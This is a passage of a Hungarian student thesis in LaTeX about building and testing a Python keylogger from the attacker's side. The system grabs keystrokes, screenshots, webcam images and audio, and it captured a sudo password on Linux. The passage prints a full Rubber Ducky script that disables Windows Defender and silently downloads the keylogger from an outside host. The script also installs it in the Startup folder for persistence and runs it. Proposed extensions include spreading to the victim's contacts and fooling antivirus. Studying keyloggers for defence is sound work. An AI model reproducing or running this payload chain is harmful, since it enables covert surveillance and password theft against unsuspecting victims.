Amint elindult az áldozat gépén a keylogger, a Hacker oldalon egy kis idő után létrejön a kapcsolat. Az ábra \ref{fig:winPC5} mutatja a Hacker oldalon a keylogger menüjét, míg az ábra \ref{fig:winPC6} ábrázolja a GUI-t.
\begin{figure}[H]
\centering
\includegraphics[width=450pt]{../images/windowsPC5}
\caption{Keylogger menüje}
\label{fig:winPC5}
\end{figure}
\begin{figure}[H]
\centering
\includegraphics[width=400pt]{../images/windowsPC6}
\caption{GUI ablak}
\label{fig:winPC6}
\end{figure}

A GUI ablakban az előzőleg tesztelt adatok látszanak, amelyek felgyültek a fejlesztés során. Ettől a ponttól teljesen működőképes a keylogger. A menüt alkalmazva lehet képernyőképet, ebkameraképet és hangfelvételt készíteni. Ha a Hacker úgy látja jónak, akár be meg is szüntetheti a kapcsolatot a Targettel, így emailen keresztül fogja megkapni az adatokat.

\subsection{Linux rendszer}
A Linux rendszeren való tesztelés során hasonló az eljárás, mint a Windows rendszeren való tesztelés során. Előszőr elindítjuk a szervert a Hacker oldalon és letöltjük a futtatható állományt a Target oldalon. Ez után elindítjuk a Hacker oldalon a szoftvert, és várjuk, hogy elinduljon a Target oldalon a keylogger. Az ábra \ref{fig:linuxPC1} mutatja az elindult keyloggert, amelynek azt a nevet adtuk, hogy \textit{UpdateLinux}. Így kevésbé feltűnő az, hogy egy nem kívánt alkalmazás fut a Target rendszerén.
\begin{figure}[H]
\centering
\includegraphics[width=450pt]{../images/linuxPC1}
\caption{Listázott folyamatok Linux rendszeren}
\label{fig:linuxPC1}
\end{figure}

A keylogger elvégzi a feladatát, tehát képes a lenyomott billentyűket elfogni, képernyőképet készíteni, webkameraképet készíteni, hangfelvételt készíteni és emailt küldeni, ha a ZeroMQ kapcsolat megszakadt.

A lenyomott billentyűk elfogása során azt is észrevettük, hogy az adminisztrátor jogosultsággal levő felhasználók jelszavát el lehet fogni, ha olyan aktivitást folyatnak, amely ifényli a felhasználó jelszavát (például a korábban említett \textit{sudo -l} parancs végrehajtása). Megjegyzés: ebben az esetben nem szolgálhatok képekkel, mert megjelenne az aktuális jelszavam.

\subsection{Ducky szkript}
A Rubber Ducky szkript generálásához létezik egy weboldal, amelyen a megírt kódból bináris állomány készül: https://ducktoolkit.com/encode. Ezt az oldalt használva a \textit{Ducky Code} részlet alatt megírjuk az alábbi kódot:
\begin{lstlisting}{language=PowerShell}
REM Disable Windows Defender with PowerShell
DELAY 1000
GUI r
DELAY 200
STRING powershell saps powershell -A 'Set-MpPreferences -DisableRea $true' -V runAs
ENTER
DELAY 200
LEFTARROW
ENTER
REM Download the keylogger
DELAY 1000
GUI r
DELAY 200
STRING powershell saps powershell
ENTER
DELAY 200
ALT y
STRING powershell -windowstyle hidden {iwr 'http://keylogger.3utilities.com:777/CTF Loader2.exe' -o 'CTF Loader2.exe';cp 'CTF Loader2.exe' 'Appdata\Roaming\Microsoft\Windows\Start Menu\Programs\Startup';saps '.\CTF Loader2.exe'}
ENTER
\end{lstlisting}
A fenti kód gyakorlatilag a billentyűzet billentyűkombinációit és a billentyűzettel való műveleteket írja le. Ez a kód Windows rendszerre készült. A UNIX rendszereken más billentyűkombinációkat és parancsokat kell megadni (például a ``GUI r'' helyett ``GUI space'' kell).

A keylogger letöltése előtt megpróbáljuk kikapcsolni a Windows Defender-t. Ezt követően letöltődik a keylogger, és elindul a rendszeren. De mielőtt elindulna a keylogger, bemásolódik a \textit{Startup} mappába, azért, hogy a számítógép ujraindítása során automatikusan elinduljon a szoftver.

A kód megírása utan rákattintunk az \textit{Encode Payload} gombra, amely megjelenít újabb két gombot, ha elfogadjuk a feltételeket. Ezek után rákattintunk \ a \textit{Download Inject.bin} gombra, amely letölti a bináris állományt. Ezt az állományt fel kell rakni a USB Rubber Ducky-ra. Megjegyzés képpen, a \textit{Language} rész alatt ki lehet választani a billentyűzet beállítását.

\section{Az opciókból álló adatátvitel a ZeroMQ segítségével}
Az opciókból álló adatokra ebben a helyzetben a képernyőképre, a webkameraképre és a hangfelvételre gondolok. Ezek az adatok a ZeroMQ protokol segítségével küldődnek el a hálózaton.

A ZeroMQ mint könyvtár bizonyos hálózati kommunikációs minták követésével, aszinkron módon működik. A ZeroMQ kommunikáció üzenetorientált. Ez azt jelenti, hogy ha egy kliens 150KB méretű üzenetet küld, akkor a szerver egy teljes és azonos üzenetet fog kapni anélkül, hogy pufferelést vagy keretezést kellene végrehajtania. Az elküldött üzenetek nagysága nincs korlátozva, azonban a kis üzeneteket másként kezelik, mint a nagy üzeneteket. A kis üzenetek a verem (stack) memóriaterületre lesznek elhelyezve, míg a nagy üzenetek a halom (heap) memóriaterületre.

Az adatokra lehet kapni példát a projektet tároló github linken: https://github.com/zsfelmeri/Keylogger\_collegeCertificate.

\chapter{Összefoglaló}\label{sec:conc}
Dolgozatomban a keyloggerek működését tanulmányoztam különböző operációs rendszereken. Először meghatározásra került a keylogger és a hozzátartozó fogalmak, majd megvizsgáltuk a keylogger típusait: Wireless, Hardver, Szoftver, Akusztikus. Ezek közül a leginkább használatosak a Hardver és a Szoftver alapú keyloggerek. Továbbá a keyloggerek elleni védekezés is tanulmányozva volt. A keyloggerek elleni védekezés szempontjából két típusu rendszert értelmeztünk: aláírás alapú és horog alapú. Ezek után az általam fejlesztett szoftverek kerültek bemutatásra, amelyeket Python nyelven írtam meg, és egy Hacker szemszögéből lettek kivitelezve. A három szoftver alatt a Hacker szoftverét, a Target szoftverét és a GUI-t értem. A Hacker oldalon monitorizálva vannak az adatok, amelyeket a Target oldalról kapunk. A GUI a Hacker oldalhoz tartozik, szerepe a valós időben való megjelenítése a lenyomott billentyűknek. A keyloggert úgy fejlesztettem, hogy több funkcionalitással rendelkezzen, mint egy átlagos keylogger. Az adatok átvitelére a ZeroMQ, egy magasabb szintű protokollt alkalmaztunk. A keylogger email-t is tud küldeni az áldozat gépéről, ehhez viszont konfigurálni kellett egy gmail fiókot. Az adatokat el lehet fogni a hálózaton, ezért úgy döntöttünk, hogy elküldés előtt titkosítsuk és tömörítsük azokat. A titkosításhoz a Python nyelv base64 modultját és a tömörítéshez a pickle modulját használtuk. A Hacker feladatához tartozik az is, hogy a python kódból futtatható állományt készítsen. Ezt a pyinstaller modul segítségével volt kivitelezve. Tesztelés során megnéztük, hogy melyik operációs rendszeren (Windows, Linux, Mac) tudjuk ellopni a felhasználó jelszavát. Sikeresnek nyilvánult a Linux rendszeren való jelszó megszerzése. Legvégül elemeztük a Ducky szkriptet, amely kikapcsolta a Windows Defender-t, letöltötte az általunk fejlesztett keyloggert, bemásolta a Startup mappába, és elindította a szoftvert.

\section{Továbbfejlesztési lehetőségek}
A szoftvert, természetesen továbbfejleszteni is lehet. Pár lehetőség erre a célra:
\begin{itemize}
\item Tobábbküldeni a keyloggert az áldozat ismerőseinek
\item Vágólap elfogása
\item Egyszerre több számítógép monitorizálása
\item Anti virus megtévesztése
\end{itemize}

% table of figures
\renewcommand{\listfigurename}{Ábrák jegyzéke}
\listoffigures
\thispagestyle{empty}

% table of tables
\renewcommand{\listtablename}{Táblázatok jegyzéke}
\listoftables
\thispagestyle{empty}

\printbibliography

\end{document}